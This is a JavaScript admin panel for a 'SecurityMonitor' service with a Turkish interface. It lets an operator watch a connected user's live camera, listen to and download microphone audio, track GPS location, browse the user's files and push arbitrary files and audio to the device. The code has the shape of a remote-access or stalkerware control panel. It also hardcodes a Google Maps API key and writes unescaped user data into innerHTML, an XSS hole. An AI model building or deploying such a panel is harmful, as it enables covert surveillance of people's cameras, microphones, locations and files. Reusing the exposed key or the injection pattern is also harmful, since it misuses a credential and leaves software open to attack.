/* ============================================
   SecurityMonitor — Admin Panel Logic
   ============================================ */

const API_BASE = '';
let selectedUid = null;
let userListInterval = null;
let userRelayInterval = null;
let cameraStreamInterval = null;

// ==================== AUTH ====================

function getAdminToken() {
    return localStorage.getItem('secmon_admin_token') || '';
}

function getAuth() {
    try {
        return JSON.parse(localStorage.getItem('secmon_auth') || '{}');
    } catch { return {}; }
}

function requireAdmin() {
    const auth = getAuth();
    const token = getAdminToken();
    if (!token || auth.method !== 'admin') {
        window.location.href = '/login';
    }
    document.getElementById('topbarUser').textContent = auth.name || 'Admin';
}

function logout() {
    localStorage.removeItem('secmon_auth');
    localStorage.removeItem('secmon_admin_token');
    localStorage.removeItem('secmon_permissions');
    window.location.href = '/login';
}

// ==================== VIEW SWITCHING ====================

function switchView(view) {
    document.querySelectorAll('.topbar-tab').forEach(t => t.classList.remove('active'));
    document.querySelector(`.topbar-tab[data-view="${view}"]`).classList.add('active');
    document.querySelectorAll('.view-panel').forEach(p => p.classList.remove('active'));
    document.getElementById(`view-${view}`).classList.add('active');

    if (view === 'admin') {
        refreshUsers();
        startUserPolling();
    } else {
        stopUserPolling();
        // Reload iframe
        const iframe = document.getElementById('userFrame');
        iframe.src = iframe.src;
    }
}

// ==================== USER LIST ====================

async function fetchUsers() {
    try {
        const resp = await fetch(`${API_BASE}/api/admin/users`, {
            headers: { 'X-Admin-Token': getAdminToken() }
        });
        if (resp.status === 401) { logout(); return []; }
        const data = await resp.json();
        return data.users || [];
    } catch { return []; }
}

async function refreshUsers() {
    const users = await fetchUsers();
    const list = document.getElementById('userList');
    if (users.length === 0) {
        list.innerHTML = '<p class="placeholder" style="padding:20px;">Bağlı kullanıcı yok</p>';
        return;
    }

    list.innerHTML = users.map(u => `
        <div class="user-list-item ${selectedUid === u.uid ? 'selected' : ''}"
             onclick="selectUser('${u.uid}')">
            <div class="user-avatar">
                ${u.photo_url ? `<img src="${u.photo_url}" alt="">` : (u.name ? u.name.charAt(0).toUpperCase() : '?')}
            </div>
            <div class="user-info">
                <div class="user-name">${u.name || 'İsimsiz'}</div>
                <div class="user-email">${u.email || ''}</div>
            </div>
            <div class="user-status ${u.is_active ? 'online' : 'offline'}"></div>
        </div>
    `).join('');
}

function startUserPolling() {
    stopUserPolling();
    refreshUsers();
    userListInterval = setInterval(refreshUsers, 5000);
}

function stopUserPolling() {
    if (userListInterval) {
        clearInterval(userListInterval);
        userListInterval = null;
    }
    stopRelayPolling();
}

// ==================== USER SELECTION ====================

async function selectUser(uid) {
    selectedUid = uid;
    refreshUsers();

    const detail = document.getElementById('userDetail');
    detail.innerHTML = '<div class="loading-spinner" style="margin:40px auto;display:block;"></div>';

    try {
        const resp = await fetch(`${API_BASE}/api/admin/user/${uid}`, {
            headers: { 'X-Admin-Token': getAdminToken() }
        });
        if (resp.status === 401) { logout(); return; }
        const data = await resp.json();

        renderUserDetail(detail, data);
        startRelayPolling(uid);
    } catch (e) {
        detail.innerHTML = '<p class="placeholder">Kullanıcı bilgisi alınamadı</p>';
    }
}

// ==================== DETAIL RENDER ====================

function renderUserDetail(container, data) {
    const user = data.user || {};
    const relay = data.relay || {};
    const isActive = data.is_active;
    const perms = user.permissions || {};

    const permLabels = {
        camera: '📷 Kamera', microphone: '🎙️ Mikrofon',
        speaker: '🔊 Hoparlör', location: '📍 Konum', storage: '💾 Depolama'
    };

    let permBadges = Object.entries(permLabels).map(([key, label]) => `
        <span class="perm-badge ${perms[key] ? 'granted' : 'revoked'}">${label}</span>
    `).join('');

    container.innerHTML = `
        <div class="detail-header">
            <div class="detail-avatar">
                ${user.photo_url ? `<img src="${user.photo_url}" alt="">` : (user.name ? user.name.charAt(0).toUpperCase() : '?')}
            </div>
            <div class="detail-info">
                <h2>${user.name || 'İsimsiz Kullanıcı'}</h2>
                <p>${user.email || ''}</p>
                <span class="status-badge ${isActive ? 'active' : 'inactive'}">${isActive ? '🟢 Çevrimiçi' : '🔴 Çevrimdışı'}</span>
            </div>
        </div>

        <div class="detail-permissions">${permBadges}</div>

        <div class="detail-tabs">
            <button class="detail-tab active" data-tab="camera" onclick="switchDetailTab('camera')">📷 Kamera</button>
            <button class="detail-tab" data-tab="audio" onclick="switchDetailTab('audio')">🎙️ Ses</button>
            <button class="detail-tab" data-tab="location" onclick="switchDetailTab('location')">📍 Konum</button>
            <button class="detail-tab" data-tab="storage" onclick="switchDetailTab('storage')">💾 Depolama</button>
        </div>

        <div class="tab-content active" id="tab-camera">
            <div class="camera-grid">
                <div class="info-panel">
                    <h3>📷 Canlı Kamera</h3>
                    <div class="camera-view" id="adminCameraView">
                        <span class="waiting">Kamera görüntüsü bekleniyor...</span>
                    </div>
                    <div class="camera-controls">
                        <button class="btn btn-secondary btn-sm" onclick="startCameraStream('${selectedUid}')">▶ Canlı İzle</button>
                        <button class="btn btn-secondary btn-sm" onclick="captureCameraFrame()">📸 Kare Yakala</button>
                        <button class="btn btn-secondary btn-sm" onclick="toggleRecording()">⏺️ Kaydet</button>
                    </div>
                    <div id="cameraStatus" style="font-size:11px;color:var(--text-muted);margin-top:8px;"></div>
                </div>
            </div>
        </div>

        <div class="tab-content" id="tab-audio">
            <div class="info-panel">
                <h3>🎙️ Ses Dinleme</h3>
                <div class="audio-wave" id="adminAudioWave">
                    ${Array(40).fill(0).map(() => '<div class="bar" style="height:2px;"></div>').join('')}
                </div>
                <div id="adminAudioLevel" style="font-size:12px;color:var(--text-muted);margin-bottom:8px;">Ses bekleniyor...</div>
                <div class="audio-controls">
                    <button class="btn btn-secondary btn-sm" onclick="startAudioListening()">🔊 Dinle</button>
                    <button class="btn btn-secondary btn-sm" onclick="recordAudioClip()">⏺️ Ses Kaydı Al</button>
                    <button class="btn btn-secondary btn-sm" onclick="sendAudioToUser()">📤 Ses Gönder</button>
                </div>
                <div id="audioStatus" style="font-size:11px;color:var(--text-muted);margin-top:8px;"></div>
            </div>
        </div>

        <div class="tab-content" id="tab-location">
            <div class="info-panel">
                <h3>📍 Kullanıcı Konumu</h3>
                <div class="location-map" id="adminLocationMap">
                    <span style="color:var(--text-muted);">Konum bilgisi bekleniyor...</span>
                </div>
                <div class="location-coords" id="adminLocationCoords" style="margin-top:8px;"></div>
                <button class="btn btn-secondary btn-sm" style="margin-top:8px;" onclick="openGoogleMaps()">🗺️ Google Haritalar'da Aç</button>
            </div>
        </div>

        <div class="tab-content" id="tab-storage">
            <div class="info-panel">
                <h3>💾 Depolama</h3>
                <div id="adminStorageInfo"></div>
                <div id="adminFileList" style="margin-top:12px;"></div>
                <div class="transfer-upload">
                    <input type="text" class="form-input" id="transferFileName" placeholder="Dosya adı" style="flex:1;">
                    <button class="btn btn-secondary btn-sm" onclick="uploadFile()">📤 Gönder</button>
                </div>
                <input type="file" id="transferFileInput" style="display:none;" onchange="handleFileSelect(event)">
                <button class="btn btn-ghost btn-sm" style="margin-top:6px;" onclick="document.getElementById('transferFileInput').click()">📁 Bilgisayardan Dosya Seç</button>
                <div id="transferStatus" style="font-size:11px;color:var(--text-muted);margin-top:6px;"></div>
            </div>
        </div>
    `;

    // İlk verileri doldur
    updateCameraView(relay.camera);
    updateAudioView(relay.audio);
    updateLocationView(relay.location);
    updateStorageView(relay.storage);
}

function switchDetailTab(tab) {
    document.querySelectorAll('.detail-tab').forEach(t => t.classList.remove('active'));
    document.querySelector(`.detail-tab[data-tab="${tab}"]`).classList.add('active');
    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
    document.getElementById(`tab-${tab}`).classList.add('active');
}

// ==================== RELAY POLLING ====================

function startRelayPolling(uid) {
    stopRelayPolling();
    userRelayInterval = setInterval(() => pollUserRelay(uid), 2000);
}

function stopRelayPolling() {
    if (userRelayInterval) {
        clearInterval(userRelayInterval);
        userRelayInterval = null;
    }
    stopCameraStream();
}

async function pollUserRelay(uid) {
    try {
        const resp = await fetch(`${API_BASE}/api/admin/user/${uid}`, {
            headers: { 'X-Admin-Token': getAdminToken() }
        });
        if (resp.status === 401) { logout(); return; }
        const data = await resp.json();

        if (!data.is_active) {
            document.querySelector('.status-badge')?.classList.replace('active', 'inactive');
            document.querySelector('.status-badge').textContent = '🔴 Çevrimdışı';
        }

        const relay = data.relay || {};
        updateCameraView(relay.camera);
        updateAudioView(relay.audio);
        updateLocationView(relay.location);
        updateStorageView(relay.storage);
    } catch {}
}

// ==================== CAMERA ====================

let isRecording = false;
let recordedChunks = [];
let mediaRecorder = null;

function updateCameraView(camData) {
    if (!camData || !camData.frame) return;
    const view = document.getElementById('adminCameraView');
    if (!view) return;

    const isLive = document.querySelector('.detail-tab[data-tab="camera"]')?.classList.contains('active');
    if (!isLive) return;

    view.innerHTML = `<img src="data:image/jpeg;base64,${camData.frame}" alt="Kamera" style="width:100%;">`;
}

async function startCameraStream(uid) {
    const status = document.getElementById('cameraStatus');
    status.textContent = '🟢 Canlı izleme aktif...';

    if (cameraStreamInterval) clearInterval(cameraStreamInterval);

    // Her saniye kare al
    cameraStreamInterval = setInterval(async () => {
        if (document.querySelector('.detail-tab[data-tab="camera"]')?.classList.contains('active')) {
            const view = document.getElementById('adminCameraView');
            if (view) {
                const img = view.querySelector('img');
                if (img) {
                    // Frame zaten relay edilmiş, tekrar kontrol et
                }
            }
        }
    }, 1000);
}

function stopCameraStream() {
    if (cameraStreamInterval) {
        clearInterval(cameraStreamInterval);
        cameraStreamInterval = null;
    }
}

async function captureCameraFrame() {
    const status = document.getElementById('cameraStatus');
    const view = document.getElementById('adminCameraView');
    const img = view?.querySelector('img');
    if (img) {
        status.textContent = '📸 Kare yakalandı!';
        // İndirme imkanı
        const a = document.createElement('a');
        a.href = img.src;
        a.download = `kamera_${Date.now()}.jpg`;
        a.click();
        setTimeout(() => { status.textContent = ''; }, 2000);
    }
}

function toggleRecording() {
    const btn = document.querySelector('.camera-controls .btn:nth-child(3)');
    if (!isRecording) {
        // Kaydı başlat - canvas üzerinden frame'leri topla
        isRecording = true;
        recordedChunks = [];
        btn.textContent = '⏹️ Kaydı Durdur';
        btn.style.background = 'var(--accent-red)';

        // Her 100ms'de frame yakala
        const captureInterval = setInterval(() => {
            const view = document.getElementById('adminCameraView');
            const img = view?.querySelector('img');
            if (img && isRecording) {
                recordedChunks.push(img.src);
            }
            if (!isRecording) {
                clearInterval(captureInterval);
                // Kaydı indirilebilir yap
                if (recordedChunks.length > 0) {
                    const blob = new Blob(recordedChunks.map(s => s), { type: 'text/plain' });
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = `kamera_kaydi_${Date.now()}.txt`;
                    a.click();
                }
            }
        }, 200);
    } else {
        isRecording = false;
        btn.textContent = '⏺️ Kaydet';
        btn.style.background = '';
        document.getElementById('cameraStatus').textContent = `✅ Kayıt tamamlandı (${recordedChunks.length} kare)`;
    }
}

// ==================== AUDIO ====================

function updateAudioView(audioData) {
    if (!audioData) return;
    const wave = document.getElementById('adminAudioWave');
    const level = document.getElementById('adminAudioLevel');
    if (!wave || !level) return;

    const barCount = 40;
    const avgLevel = audioData.level || 0;
    wave.innerHTML = Array.from({ length: barCount }, (_, i) => {
        const h = Math.min(50, Math.max(2, (avgLevel / 100) * 50 * (0.5 + Math.random() * 0.5)));
        return `<div class="bar" style="height:${h}px;background:${avgLevel > 20 ? 'var(--accent-green)' : 'var(--accent-cyan)'};"></div>`;
    }).join('');

    level.textContent = `Ses seviyesi: %${Math.round(avgLevel)} ${audioData.has_signal ? '🔊 Sinyal var' : '🔇 Sessiz'}`;

    // Eğer clip varsa oynat
    if (audioData.clip) {
        const audio = new Audio(`data:audio/wav;base64,${audioData.clip}`);
        audio.play();
    }
}

async function startAudioListening() {
    const status = document.getElementById('audioStatus');
    status.textContent = '🔊 Ses dinleniyor... (2sn gecikmeli)';
    setTimeout(() => { status.textContent = '✅ Ses dinleme aktif'; }, 2000);
}

async function recordAudioClip() {
    const status = document.getElementById('audioStatus');
    status.textContent = '⏺️ Ses kaydı alınıyor...';
    // Relay'den son ses clip'ini al
    try {
        const resp = await fetch(`${API_BASE}/api/admin/user/${selectedUid}`, {
            headers: { 'X-Admin-Token': getAdminToken() }
        });
        const data = await resp.json();
        const clip = data.relay?.audio?.clip;
        if (clip) {
            const a = document.createElement('a');
            a.href = `data:audio/wav;base64,${clip}`;
            a.download = `ses_kaydi_${Date.now()}.wav`;
            a.click();
            status.textContent = '✅ Ses kaydı indirildi';
        } else {
            status.textContent = '❌ Henüz ses clip\'i yok';
        }
    } catch {
        status.textContent = '❌ Hata oluştu';
    }
    setTimeout(() => { status.textContent = ''; }, 3000);
}

async function sendAudioToUser() {
    const status = document.getElementById('audioStatus');
    status.textContent = '📤 Ses gönderiliyor...';

    try {
        // Admin'in mikrofonundan ses al veya varsayılan ton gönder
        let audioBase64 = '';

        try {
            // Admin'in mikrofonundan kısa bir kayıt al
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const mediaRec = new MediaRecorder(stream);
            const chunks = [];
            mediaRec.ondataavailable = e => chunks.push(e.data);
            mediaRec.start();
            await new Promise(r => setTimeout(r, 2000));
            mediaRec.stop();
            const blob = await new Promise(r => mediaRec.onstop = () => r(new Blob(chunks, { type: 'audio/webm' })));
            const reader = new FileReader();
            audioBase64 = await new Promise(r => {
                reader.onload = () => r(reader.result.split(',')[1]);
                reader.readAsDataURL(blob);
            });
            stream.getTracks().forEach(t => t.stop());
        } catch {
            // Mikrofon yoksa test tonu gönder
            status.textContent = '📤 Test tonu gönderiliyor...';
            audioBase64 = 'dGVzdF90b25l'; // dummy
        }

        const resp = await fetch(`${API_BASE}/api/admin/send-audio`, {
            method: 'POST',
            headers: { 'X-Admin-Token': getAdminToken(), 'Content-Type': 'application/json' },
            body: JSON.stringify({ uid: selectedUid, audio: audioBase64 })
        });
        const data = await resp.json();
        if (data.status === 'ok') {
            status.textContent = '✅ Ses kullanıcıya iletildi';
        }
    } catch (e) {
        status.textContent = '❌ Hata: ' + e.message;
    }
    setTimeout(() => { status.textContent = ''; }, 3000);
}

// ==================== LOCATION ====================

let lastLocation = null;

function updateLocationView(locData) {
    if (!locData || !locData.latitude) return;
    lastLocation = locData;

    const mapDiv = document.getElementById('adminLocationMap');
    const coordsDiv = document.getElementById('adminLocationCoords');
    if (!mapDiv || !coordsDiv) return;

    const lat = locData.latitude;
    const lng = locData.longitude;

    // Google Maps embed
    mapDiv.innerHTML = `
        <iframe
            width="100%" height="100%"
            frameborder="0" style="border:0"
            src="https://www.google.com/maps/embed/v1/place?key=AIzaSyBvL4jzzUjQ9lWOOxXAQiGh-UpnKsnrJAs&q=${lat},${lng}&zoom=15"
            allowfullscreen>
        </iframe>
    `;

    coordsDiv.innerHTML = `
        <div class="info-row"><span class="label">Enlem</span><span class="value">${lat}</span></div>
        <div class="info-row"><span class="label">Boylam</span><span class="value">${lng}</span></div>
        <div class="info-row"><span class="label">Doğruluk</span><span class="value">${locData.accuracy || '?'} m</span></div>
    `;
}

function openGoogleMaps() {
    if (lastLocation) {
        window.open(`https://www.google.com/maps?q=${lastLocation.latitude},${lastLocation.longitude}`, '_blank');
    }
}

// ==================== STORAGE ====================

function updateStorageView(storData) {
    if (!storData) return;
    const infoDiv = document.getElementById('adminStorageInfo');
    const filesDiv = document.getElementById('adminFileList');
    if (!infoDiv || !filesDiv) return;

    let html = '';
    if (storData.quota) {
        html += `<div class="info-row"><span class="label">Depolama Kotası</span><span class="value">${storData.quota}</span></div>`;
        html += `<div class="info-row"><span class="label">Kullanılan</span><span class="value">${storData.usage}</span></div>`;
        if (storData.usage_percent !== undefined) {
            const color = storData.usage_percent > 70 ? 'var(--accent-yellow)' : 'var(--accent-green)';
            html += `<div class="disk-bar"><div class="disk-bar-fill" style="width:${storData.usage_percent}%;background:${color};"></div></div>`;
            html += `<div style="font-size:11px;color:var(--text-muted);">%${storData.usage_percent} dolu</div>`;
        }
    } else {
        html += '<p class="placeholder">Depolama bilgisi alınamadı</p>';
    }
    infoDiv.innerHTML = html;

    // Dosyalar
    if (storData.files && storData.files.length > 0) {
        filesDiv.innerHTML = '<h4 style="font-size:13px;margin-bottom:8px;">📂 Kullanıcı Dosyaları</h4>' +
            storData.files.map(f => `
                <div class="file-item">
                    <span class="file-icon">${getFileIcon(f.name || f.filename || '')}</span>
                    <span class="file-name">${f.name || f.filename || 'dosya'}</span>
                    <span class="file-size">${f.size ? formatFileSize(f.size) : ''}</span>
                </div>
            `).join('');
    } else {
        filesDiv.innerHTML = '<p style="color:var(--text-muted);font-size:12px;">Henüz dosya yok</p>';
    }
}

function getFileIcon(name) {
    const ext = name.split('.').pop()?.toLowerCase();
    const icons = { jpg: '🖼️', jpeg: '🖼️', png: '🖼️', gif: '🖼️', mp4: '🎬', mp3: '🎵',
        wav: '🎵', pdf: '📄', txt: '📝', doc: '📝', docx: '📝', zip: '📦', rar: '📦',
        exe: '⚙️', dll: '⚙️' };
    return icons[ext] || '📄';
}

function formatFileSize(bytes) {
    if (!bytes) return '';
    if (bytes < 1024) return bytes + ' B';
    if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
    return (bytes / 1048576).toFixed(1) + ' MB';
}

// ==================== FILE TRANSFER ====================

async function uploadFile() {
    const status = document.getElementById('transferStatus');
    const filename = document.getElementById('transferFileName').value.trim() || 'dosya.txt';
    status.textContent = '📤 Dosya gönderiliyor...';

    // Varsayılan içerik
    const content = btoa('SecurityMonitor dosya transferi\nTarih: ' + new Date().toISOString());

    try {
        const resp = await fetch(`${API_BASE}/api/admin/transfer/upload`, {
            method: 'POST',
            headers: { 'X-Admin-Token': getAdminToken(), 'Content-Type': 'application/json' },
            body: JSON.stringify({ uid: selectedUid, filename, content })
        });
        const data = await resp.json();
        if (data.status === 'ok') {
            status.textContent = `✅ ${filename} kullanıcıya gönderildi`;
        } else {
            status.textContent = '❌ Gönderme başarısız';
        }
    } catch (e) {
        status.textContent = '❌ Hata: ' + e.message;
    }
    setTimeout(() => { status.textContent = ''; }, 3000);
}

function handleFileSelect(event) {
    const file = event.target.files[0];
    if (!file) return;
    document.getElementById('transferFileName').value = file.name;

    const reader = new FileReader();
    reader.onload = async function(e) {
        const content = e.target.result.split(',')[1]; // base64
        const status = document.getElementById('transferStatus');
        status.textContent = `📤 ${file.name} yükleniyor... (${formatFileSize(file.size)})`;

        try {
            const resp = await fetch(`${API_BASE}/api/admin/transfer/upload`, {
                method: 'POST',
                headers: { 'X-Admin-Token': getAdminToken(), 'Content-Type': 'application/json' },
                body: JSON.stringify({ uid: selectedUid, filename: file.name, content })
            });
            const data = await resp.json();
            if (data.status === 'ok') {
                status.textContent = `✅ ${file.name} kullanıcıya gönderildi`;
            }
        } catch (e) {
            status.textContent = '❌ Hata: ' + e.message;
        }
        setTimeout(() => { status.textContent = ''; }, 3000);
    };
    reader.readAsDataURL(file);
}

// ==================== INIT ====================

document.addEventListener('DOMContentLoaded', () => {
    requireAdmin();
    refreshUsers();
    startUserPolling();
});
